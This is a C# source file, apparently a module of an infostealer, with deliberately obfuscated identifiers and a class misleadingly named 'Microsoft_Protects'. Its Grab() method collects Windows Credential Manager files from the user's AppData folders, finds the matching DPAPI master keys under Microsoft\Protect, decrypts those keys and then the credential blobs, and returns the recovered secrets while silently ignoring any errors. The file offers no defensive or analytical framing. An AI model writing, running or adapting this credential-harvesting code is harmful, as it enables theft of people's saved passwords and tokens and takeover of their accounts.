using System;
using System.Collections.Generic;
using System.IO;
using C6Zy;
using PK42;
using reJu9lk2r;

namespace rk937aHHc
{
	public class Microsoft_Protects : EtbH
	{
		public string SXTRdceF { get; set; }

		public List<WTitxI2m> Grab()
		{
			List<WTitxI2m> list = new List<WTitxI2m>();

			list.AddRange(this.AW4QMZRD(IEF.f4t8Y.G9JoZ7AMUom));
			list.AddRange(this.AW4QMZRD(IEF.f4t8Y.Wud31nrfwl));

			return list;
		}

        private List<WTitxI2m> AW4QMZRD(IEF.f4t8Y target)
        {
            List<WTitxI2m> list = new List<WTitxI2m>();
            List<string> credentialFiles = new List<string>();

            string localCredPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Microsoft\\Credentials"
            );

            string roamingCredPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft\\Credentials"
            );

            if (Directory.Exists(localCredPath))
                credentialFiles.AddRange(Directory.GetFiles(localCredPath));

            if (Directory.Exists(roamingCredPath))
                credentialFiles.AddRange(Directory.GetFiles(roamingCredPath));

            foreach (string credFile in credentialFiles)
            {
                Ro9zpAaKm.AWtWeQXkJ5g credInfo = Ro9zpAaKm.E8HuSEE3oc(credFile);

                string protectRoot = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Microsoft\\Protect"
                );

                foreach (string sidDir in Directory.GetDirectories(protectRoot))
                {
                    string masterKeyPath = Path.Combine(sidDir, credInfo.sGO80W.ToString());

                    if (!File.Exists(masterKeyPath))
                        continue;

                    try
                    {
                        byte[] masterKey = Ro9zpAaKm.AUe0Tnh(
                            "",
                            Directory.GetParent(masterKeyPath).FullName
                        );

                        Dictionary<string, string> decryptedMasterKey =
                            Ro9zpAaKm.axwpQ4(File.ReadAllBytes(masterKeyPath), masterKey);

                        byte[] decryptedCredBlob =
                            Ro9zpAaKm.IVT7E6h3(
                                File.ReadAllBytes(credFile),
                                decryptedMasterKey,
                                "credential",
                                false
                            );

                        WTitxI2m cred = Ro9zpAaKm.kgd3oS(decryptedCredBlob, target);

                        if (cred != null)
                            list.Add(cred);
                    }
                    catch
                    {
                    }
                }
            }

            return list;
        }
    }
}
